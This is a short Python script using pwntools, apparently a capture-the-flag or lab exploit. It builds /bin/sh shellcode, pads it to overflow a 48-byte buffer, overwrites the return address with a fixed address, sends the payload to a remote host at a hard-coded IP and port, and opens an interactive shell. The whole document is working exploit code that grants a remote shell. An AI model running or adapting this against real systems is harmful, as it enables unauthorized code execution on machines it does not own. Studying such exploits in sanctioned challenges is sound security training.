from pwn import *

context.arch = 'amd64'

shellcode = asm(shellcraft.sh())

target_addr = 0x00404080

shellcode_addr = target_addr

payload = shellcode 
payload += b"A" * (48 - len(shellcode)) 
payload += p64(shellcode_addr) 

p = remote("130.192.5.212", 1952)

print(p.recvline())

p.sendline(payload)

p.interactive()